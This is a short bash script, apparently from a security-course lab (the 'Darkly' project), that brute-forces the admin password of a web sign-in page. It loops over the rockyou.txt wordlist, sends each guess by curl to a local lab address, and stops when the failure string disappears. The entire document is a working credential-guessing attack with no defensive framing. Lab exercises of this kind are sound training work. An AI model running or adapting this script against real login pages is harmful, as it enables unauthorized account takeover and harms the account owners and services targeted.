 #!/bin/bash
result=1
#var0=0
file="/nfs/homes/lburnet/Documents/Darkly/Brute_force_sign_in/Ressources/rockyou.txt"
while [[ "$result" == "1" ]]
	do
		read password
		address="http://10.12.200.32/?page=signin&username=admin&password="$password"&Login=Login#"
#echo $address
		result=`curl -s $address | grep "WrongAnswer"| wc -l`
	done < "$file"
echo "password for admin is $password"